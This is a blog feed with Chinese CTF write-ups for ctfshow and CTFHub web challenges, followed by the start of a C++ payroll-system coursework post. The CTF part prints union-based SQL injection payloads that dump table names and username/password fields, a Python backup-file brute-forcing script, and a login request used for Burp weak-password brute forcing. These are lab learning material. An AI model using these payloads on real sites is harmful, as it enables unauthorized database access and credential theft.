<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure></div>


</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_6.png" alt="ctfshow_web7_6"></p>
<blockquote>
<p>查看目标FLAG</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png" alt="ctfshow_web7_7"></p>
<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><blockquote>
<p>SQL联合注入，GET请求方式</p>
</blockquote>
<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_1.png" alt="ctfshow_web14_1" style="zoom:80%;">

<blockquote>
<p>尝试输入c获取$url,发现输入555555、3333、6000000时间过于漫长，输入1、2、3发现输入3时输出并非@A@,而是@<a class="link" href="mailto:&#x41;&#64;&#104;&#101;&#x72;&#101;&#95;&#x31;&#x73;&#x5f;&#x79;&#x6f;&#x75;&#x72;&#95;&#x66;&#49;&#97;&#x67;&#46;&#112;&#104;&#112;">&#x41;&#64;&#104;&#101;&#x72;&#101;&#95;&#x31;&#x73;&#x5f;&#x79;&#x6f;&#x75;&#x72;&#95;&#x66;&#49;&#97;&#x67;&#46;&#112;&#104;&#112; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>@A@，或许here_1s_your_f1ag.php里面就包含flag，查看here_1s_your_f1ag.php文件，发现查询页面，查看是否能进行SQL注入</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_2.png" alt="ctfshow_web14_2"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_3.png" alt="ctfshow_web14_3"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_4.png" alt="ctfshow_web14_4"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_5.png" alt="ctfshow_web14_5"></p>
<blockquote>
<p>通过以上判断该题为SQL注入，注入点为数值型注入, 页面有回显, 推荐使用联合注入</p>
</blockquote>
<blockquote>
<p><u><strong>获取当前使用的数据库(爆库）</strong></u></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/database()</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_6.png" alt="ctfshow_web14_6"></p>
<blockquote>
<p><u><strong>获取数据库中的表(爆表)</strong></u></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_7.png" alt="ctfshow_web14_7"></p>
<blockquote>
<p><u><strong>获取表中的字段(爆字段)</strong></u></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&#x27;content&#x27;</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_8.png" alt="ctfshow_web14_8"></p>
<blockquote>
<p><u><strong>查询字段内容(查字段)</strong></u></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(username,password)/**/from/**/content</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_9.png" alt="ctfshow_web14_9"></p>
<blockquote>
<p>flag不在这，它不讲武德了啊，看来flag不在这，回去看PHP代码，里面有一个Include(“secret.php”);或许真的flag就在里面</p>
</blockquote>
<blockquote>
<p>先访问一下 secret.php 文件, 可以正常访问, 没有报404, 说明这个文件确实存在, 而且就在根目录下, apache的默认网站根路径是 &#x2F;var&#x2F;www&#x2F;html, 我们试一下读这个文件的内容</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_10.png" alt="ctfshow_web14_10"></p>
<blockquote>
<p>发现提示&#x2F;real_flag_is_here,查看地址，发现flag</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_11.png" alt="ctfshow_web14_11"></p>
<h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
<hr>
<p>用burpsuit抓包,重放，将GET改成<strong>CTFHUB</strong>，发送即可获得flag</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_1.png" alt="BURPSUIT"></p>
<p>falg</p>
<hr>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_2.png" alt="flag"></p>
<hr>
<h3 id="信息页面隐藏"><a href="#信息页面隐藏" class="headerlink" title="信息页面隐藏"></a>信息页面隐藏</h3><hr>
<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_1.png" alt="CTFHUB_WEB_2_1" style="zoom: 80%;">

<p>看见页面信息繁杂，flag可能就隐藏在页面中，火狐快捷键*<u><strong>Ctrl+f</strong></u>*快捷查找，输入flag找到FLAG。</p>
<hr>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_2.png" alt="CTFHUB_WEB_2_2"></p>
<hr>
<h3 id="备份文件下载——网站源码"><a href="#备份文件下载——网站源码" class="headerlink" title="备份文件下载——网站源码"></a>备份文件下载——网站源码</h3><p><strong>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</strong></p>
<hr>
<blockquote>
<h4 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h4><hr>
<ul>
<li>tar</li>
<li>tar.gz</li>
<li>zip</li>
<li>rar</li>
</ul>
<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><hr>
<ul>
<li>web</li>
<li>website</li>
<li>backup</li>
<li>back</li>
<li>www</li>
<li>wwwroot</li>
<li>temp</li>
</ul>
</blockquote>
<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_1.png" alt="CTFHUB_WEB_3_1" style="zoom:50%;">

<p>文件下载，用python脚本，requests</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line"></span><br><span class="line">li1=[<span class="string">&quot;web&quot;</span>,<span class="string">&quot;website&quot;</span>,<span class="string">&quot;backup&quot;</span>,<span class="string">&quot;back&quot;</span>,<span class="string">&quot;www&quot;</span>,<span class="string">&quot;wwwroot&quot;</span>,<span class="string">&quot;temp&quot;</span>]</span><br><span class="line">li2=[<span class="string">&quot; tar&quot;</span>,<span class="string">&quot;tar.gz&quot;</span>,<span class="string">&quot;zip&quot;</span>,<span class="string">&quot;rar&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url +<span class="string">&quot;/&quot;</span>+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Response [404]&gt;//1</span><br><span class="line">&lt;Response [404]&gt;//2</span><br><span class="line">&lt;Response [404]&gt;//3</span><br><span class="line">&lt;Response [404]&gt;//4</span><br><span class="line">&lt;Response [404]&gt;//5</span><br><span class="line">&lt;Response [404]&gt;//6</span><br><span class="line">&lt;Response [404]&gt;//7</span><br><span class="line">&lt;Response [404]&gt;//8</span><br><span class="line">&lt;Response [404]&gt;//9</span><br><span class="line">&lt;Response [404]&gt;//10</span><br><span class="line">&lt;Response [404]&gt;//11</span><br><span class="line">&lt;Response [404]&gt;//12</span><br><span class="line">&lt;Response [404]&gt;//13</span><br><span class="line">&lt;Response [404]&gt;//14</span><br><span class="line">&lt;Response [404]&gt;//15</span><br><span class="line">&lt;Response [404]&gt;//16</span><br><span class="line">&lt;Response [404]&gt;//17</span><br><span class="line">&lt;Response [404]&gt;//18</span><br><span class="line">&lt;Response [200]&gt;//[200]19</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br></pre></td></tr></table></figure></div>

<p>得到备份文件”<a class="link" href="http://www.zip/">www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</p>
<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwww.zip%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%BE%97%E5%88%B0%E5%8E%8B%E7%BC%A9%E5%8C%85www.zip%EF%BC%8C%E8%A7%A3%E5%8E%8B%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip直接访问www.zip下载，得到压缩包www.zip，解压打开文件，如图： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_2.png" alt="CTFHUB_WEB_3_2"></p>
<p>打开flag文件，发现没有flag</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_3.png" alt="CTFHUB_WEB_3_3"></p>
<p>直接用</p>
<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt%E5%BE%97%E5%88%B0flag">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt得到flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Web-弱口令"><a href="#Web-弱口令" class="headerlink" title="Web_弱口令"></a>Web_弱口令</h2><blockquote>
<p><strong>弱口令</strong></p>
<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 </p>
</blockquote>
<p>使用<code>BurpSuite</code>中<code>Intruder</code>模块 ，即暴力破解模块(或在fuzz中使用)</p>
<p>开启burp代理</p>
<p>登录信息随便填，抓到request请求如下</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=ctfhub&amp;referer=</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_2.png" alt="CTFHUB_WEB_4_2"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_3.png" alt="CTFHUB_WEB_4_3"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png" alt="CTFHUB_WEB_4_4"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png" alt="CTFHUB_WEB_4_5"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
        <tag>ctf.show</tag>
      </tags>
  </entry>
  <entry>
    <title>C++小型公司工资管理系统</title>
    <url>/2024/01/17/%E5%B0%8F%E5%9E%8B%E5%85%AC%E5%8F%B8%E5%B7%A5%E8%B5%84%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fcpp/</url>
    <content><![CDATA[<h2 id="课题要求"><a href="#课题要求" class="headerlink" title="课题要求"></a>课题要求</h2><p><em><strong>“小型公司工资管理系统设计”</strong></em></p>
<p><strong>1</strong>、<strong>问题描述</strong></p>
<p><strong>某公司需要存储雇员的编号、姓名、性别、所在部门，级别，并进行工资的计算。其中，雇员分为经理、技术人员、销售人员和销售经理。四类人员的月薪计算方法如下：经理拿固定月薪；技术人员按小时领取月薪；销售人员按其当月销售额的提成领取工资；销售经理既拿固定月薪也领取销售提成。</strong></p>
<p><strong>设计一程序能够对公司人员进行管理，应用到继承、抽象类、虚函数、虚基类、多态和文件的输入&#x2F;输出等内容。</strong></p>
<p><strong>2</strong>、<strong>功能要求</strong></p>
<p><strong>（1）添加功能：程序能够任意添加上述四类人员的记录，可提供选择界面供用户选择所要添加的人员类别，要求员工的编号要唯一，如果添加了重复编号的记录时，则提示数据添加重复并取消添加。</strong></p>
<p><strong>（2）查询功能：可根据编号、姓名等信息对已添加的记录进行查询，如果未找到，给出相应的提示信息，如果找到，则显示相应的记录信息；</strong></p>
<p><strong>（3）显示功能：可显示当前系统中所有记录，每条记录占据一行。</strong></p>
<p><strong>（4）编辑功能：可根据查询结果对相应的记录进行修改，修改时注意编号的唯一性。</strong></p>
<p><strong>（5）删除功能：主要实现对已添加的人员记录进行删除。如果当前系统中没有相应的人员记录，则提示“记录为空！”并返回操作；否则，输入要删除的人员的编号或姓名，根据所输入的信息删除该人员记录，如果没有找到该人员信息，则提示相应的记录不存。</strong></p>
<p><strong>（6）统计功能：能根据多种参数进行人员的统计。例如，统计四类人员数量以及总数，</strong></p>
<p><strong>或者统计男、女员工的数量，或者统计平均工资、最高工资、最低工资等信息。</strong></p>
<p><strong>（7）保存功能：可将当前系统中各类人员记录存入文件中，存入方式任意。</strong></p>
<p><strong>（8）读取功能：可将保存在文件中的人员信息读入到当前系统中，供用户进行使用。</strong></p>
<p><strong>3</strong>、<strong>问题的解决方案</strong></p>
<p><strong>根据系统功能要求，可以将问题解决分为以下步骤：</strong></p>
<p><strong>（1）应用系统分析，建立该系统的功能模块框图以及界面的组织和设计；</strong></p>
<p><strong>（2）分析系统中的各个实体及它们之间的关系；</strong></p>
<p><strong>（3）根据问题描述，设计系统的类层次；</strong></p>
<p><strong>（4）完成类层次中各个类的描述；</strong></p>
<p><strong>（5）完成类中各个成员函数的定义；</strong></p>
<p><strong>（6）完成系统的应用模块；</strong></p>
<p><strong>（7）功能调试；</strong></p>
<p><strong>（8）完成系统总结报告。</strong></p>
<h2 id="main-cpp"><a href="#main-cpp" class="headerlink" title="main.cpp"></a>main.cpp</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;employee.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">init_list</span>();</span><br><span class="line">	<span class="built_in">load</span>();</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	<span class="built_in">menu</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="employee-h"><a href="#employee-h" class="headerlink" title="employee.h"></a>employee.h</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employee_base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Employee_base</span>();</span><br><span class="line">	<span class="built_in">Employee_base</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,string t) :<span class="built_in">id</span>(i), <span class="built_in">name</span>(n), <span class="built_in">gender</span>(g), <span class="built_in">department</span>(d), <span class="built_in">level</span>(l), <span class="built_in">Salary</span>(s),<span class="built_in">type</span>(t) &#123;&#125;;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getId</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getname</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getgender</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getdepartment</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getlevel</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">getsalary</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">gettype</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> id;<span class="comment">//编号</span></span><br><span class="line">	string name;<span class="comment">//姓名</span></span><br><span class="line">	string gender;<span class="comment">//性别</span></span><br><span class="line">	string department;<span class="comment">//部门</span></span><br><span class="line">	string level;<span class="comment">//级别</span></span><br><span class="line">	<span class="type">double</span> Salary;</span><br><span class="line">	string type;<span class="comment">//类型</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Manager</span>:<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Manager</span>();</span><br><span class="line">	<span class="built_in">Manager</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> m,string t) :<span class="built_in">Employee_base</span>(i,n,g,d,l,s,t),<span class="built_in">MonthSalary</span>(m)&#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addmanager</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> MonthSalary;<span class="comment">//月薪</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Salesperson</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Salesperson</span>();</span><br><span class="line">	<span class="built_in">Salesperson</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> sa,<span class="type">double</span> c,string t) :<span class="built_in">Employee_base</span>(i, n, g, d, l, s,t) ,<span class="built_in">SalesAmount</span>(sa),<span class="built_in">commision</span>(c)&#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addsalesperson</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> SalesAmount;<span class="comment">//销售额</span></span><br><span class="line">	<span class="type">double</span> commision;<span class="comment">//提成率</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SalesManager</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">SalesManager</span>();</span><br><span class="line">	<span class="built_in">SalesManager</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> m,<span class="type">double</span> sa,<span class="type">double</span> c,string t) :<span class="built_in">Employee_base</span>(i, n, g, d, l, s,t),<span class="built_in">MonthSalary</span>(m),<span class="built_in">SalesAmount</span>(sa),<span class="built_in">commision</span>(c) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addsalesmanager</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> MonthSalary;</span><br><span class="line">	<span class="type">double</span> SalesAmount;</span><br><span class="line">	<span class="type">double</span> commision;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Technician</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Technician</span>();</span><br><span class="line">	<span class="built_in">Technician</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> t,<span class="type">double</span> h,string ty) :<span class="built_in">Employee_base</span>(i, n, g, d, l, s,ty),<span class="built_in">time</span>(t),<span class="built_in">hourlyWage</span>(h)&#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addtechnician</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> time;<span class="comment">//工作时间</span></span><br><span class="line">	<span class="type">double</span> hourlyWage;<span class="comment">//时薪</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employees</span>:<span class="keyword">virtual</span> <span class="keyword">public</span> Manager, <span class="keyword">virtual</span> <span class="keyword">public</span> Salesperson, <span class="keyword">virtual</span> <span class="keyword">public</span> SalesManager, <span class="keyword">virtual</span> <span class="keyword">public</span> Technician</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">add_employee</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showEmployees</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifyname</span><span class="params">()</span></span>;<span class="comment">//修改姓名</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifygender</span><span class="params">()</span></span>;<span class="comment">//修改性别</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifydepartment</span><span class="params">()</span></span>;<span class="comment">//修改部门</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifylevel</span><span class="params">()</span></span>;<span class="comment">//修改级别</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifysalary</span><span class="params">()</span></span>;<span class="comment">//修改工资</span></span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">saveid</span><span class="params">(<span class="type">int</span> Id)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savename</span><span class="params">(string Name)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savegender</span><span class="params">(string gender)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savedepartment</span><span class="params">(string department)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savelevel</span><span class="params">(string level)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savesalary</span><span class="params">(<span class="type">double</span> salary)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">	Manager m;</span><br><span class="line">	Salesperson	s;</span><br><span class="line">	SalesManager sm;</span><br><span class="line">	Technician t;</span><br><span class="line">	Employees e;</span><br><span class="line">	Node* next;</span><br><span class="line">&#125;Node,*Linklist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ide</span><span class="params">(<span class="type">int</span> Id)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listlength</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clear_buffer</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_list</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display_all</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">static_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">load</span><span class="params">()</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

